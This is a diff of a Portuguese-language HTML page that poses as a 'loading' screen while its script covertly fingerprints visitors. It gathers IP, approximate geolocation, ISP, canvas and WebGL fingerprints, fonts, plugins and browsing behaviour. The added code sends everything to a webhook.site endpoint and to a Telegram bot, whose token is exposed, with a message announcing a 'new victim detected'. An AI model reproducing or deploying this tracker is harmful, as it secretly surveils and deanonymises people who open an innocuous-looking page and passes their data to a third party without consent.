@@ -2,21 +2,14 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Verificando...</title>
+  <title>Carregando...</title>
   <style>
-    body {
-      margin: 0;
-      background: #000;
-    }
-    img {
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-    }
+    body { margin: 0; background: #000; }
+    img { width: 100vw; height: 100vh; object-fit: cover; }
   </style>
 </head>
 <body>
-  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="carregando">
+  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="carregando...">
 
   <script>
     const inicio = Date.now();
@@ -26,76 +19,28 @@
       if (e.clientY < 0) tentouSair = true;
     });
 
-    async function fingerprint() {
-      const ip = await fetch("https://api.ipify.org?format=json")
-        .then(r => r.json()).then(d => d.ip).catch(() => "Desconhecido");
-
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
+    function getCanvasFingerprint() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
       ctx.textBaseline = "top";
       ctx.font = "14px 'Arial'";
       ctx.fillText("fingerprint", 2, 2);
-      const canvasFP = canvas.toDataURL();
+      return canvas.toDataURL();
+    }
 
-      const gl = document.createElement("canvas").getContext("webgl");
-      const glRenderer = gl ? gl.getParameter(gl.RENDERER) : "Desconhecido";
-
-      const dados = {
-        ip: ip,
-        idioma: navigator.language,
-        sistema: navigator.platform,
-        navegador: navigator.userAgent,
-        fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        resolucao: screen.width + "x" + screen.height,
-        touch: 'ontouchstart' in window ? "Sim" : "Não",
-        tempoNaPagina: Math.floor((Date.now() - inicio) / 1000) + "s",
-        tentouSair: tentouSair ? "Sim" : "Não",
-        canvasFingerprint: canvasFP.slice(100, 140), // resumo
-        webglRenderer: glRenderer,
-        fontes: getFontList(),
-        plugins: Array.from(navigator.plugins).map(p => p.name)
-      };
-
-      // Enviar para Webhook.site
-      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(dados)
-      });
-
-      // Enviar para Telegram
-      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: 94845670,
-          text: `
-🔍 *Nova vítima identificada* 🔍
-
-IP: ${dados.ip}
-Sistema: ${dados.sistema}
-Navegador: ${dados.navegador}
-Idioma: ${dados.idioma}
-Fuso horário: ${dados.fusoHorario}
-Resolução: ${dados.resolucao}
-Touchscreen: ${dados.touch}
-Tempo na página: ${dados.tempoNaPagina}
-Tentou sair: ${dados.tentouSair}
-Canvas Fingerprint: ${dados.canvasFingerprint}
-WebGL Renderer: ${dados.webglRenderer}
-Fontes: ${dados.fontes.join(", ").slice(0, 300)}...
-Plugins: ${dados.plugins.join(", ").slice(0, 300)}...
-          `.trim(),
-          parse_mode: "Markdown"
-        })
-      });
+    function getWebGLRenderer() {
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } catch {
+        return "Não suportado";
+      }
     }
 
     function getFontList() {
-      const fonts = [
-        'Arial', 'Verdana', 'Times New Roman', 'Courier', 'Tahoma',
-        'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Calibri'
-      ];
+      const fonts = ['Arial','Verdana','Times New Roman','Courier','Tahoma','Georgia','Comic Sans MS','Impact','Trebuchet MS','Calibri'];
       const available = [];
       const canvas = document.createElement("canvas");
       const context = canvas.getContext("2d");
@@ -105,7 +50,6 @@ Plugins: ${dados.plugins.join(", ").slice(0, 300)}...
       context.textBaseline = "top";
       context.font = "72px monospace";
       const defaultWidth = context.measureText(testText).width;
-
       fonts.forEach(font => {
         context.font = `72px '${font}', monospace`;
         if (context.measureText(testText).width !== defaultWidth) {
@@ -113,6 +57,75 @@ Plugins: ${dados.plugins.join(", ").slice(0, 300)}...
         }
       });
       return available;
+    }
+
+    async function fingerprint() {
+      const ipData = await fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .catch(() => ({}));
+
+      const data = {
+        ip: ipData.ip || "Desconhecido",
+        cidade: ipData.city || "N/A",
+        estado: ipData.region || "N/A",
+        pais: ipData.country_name || "N/A",
+        provedor: ipData.org || "N/A",
+        asn: ipData.asn || "N/A",
+        fuso: ipData.timezone || "N/A",
+        latitude: ipData.latitude || "N/A",
+        longitude: ipData.longitude || "N/A",
+        idioma: navigator.language,
+        sistema: navigator.platform,
+        navegador: navigator.userAgent,
+        resolucao: `${screen.width}x${screen.height}`,
+        touch: 'ontouchstart' in window ? "Sim" : "Não",
+        tempoNaPagina: `${Math.floor((Date.now() - inicio) / 1000)}s`,
+        tentouSair: tentouSair ? "Sim" : "Não",
+        canvasFingerprint: getCanvasFingerprint().slice(100, 140),
+        webglRenderer: getWebGLRenderer(),
+        fontes: getFontList(),
+        plugins: Array.from(navigator.plugins).map(p => p.name)
+      };
+
+      // Enviar pro Webhook.site
+      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      // Enviar pro Telegram
+      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: 94845670,
+          text: `
+🧠 *Nova vítima detectada*
+
+IP: ${data.ip}
+Cidade/Estado: ${data.cidade} / ${data.estado}
+País: ${data.pais}
+Provedor: ${data.provedor}
+ASN: ${data.asn}
+Localização: ${data.latitude}, ${data.longitude}
+Fuso horário: ${data.fuso}
+
+Sistema: ${data.sistema}
+Navegador: ${data.navegador}
+Idioma: ${data.idioma}
+Resolução: ${data.resolucao}
+Touchscreen: ${data.touch}
+Tempo na página: ${data.tempoNaPagina}
+Tentou sair: ${data.tentouSair}
+
+Canvas FP: ${data.canvasFingerprint}
+WebGL: ${data.webglRenderer}
+Fontes: ${data.fontes.join(", ").slice(0, 200)}...
+Plugins: ${data.plugins.join(", ").slice(0, 200)}...
+          `.trim()
+        })
+      });
     }
 
     fingerprint();
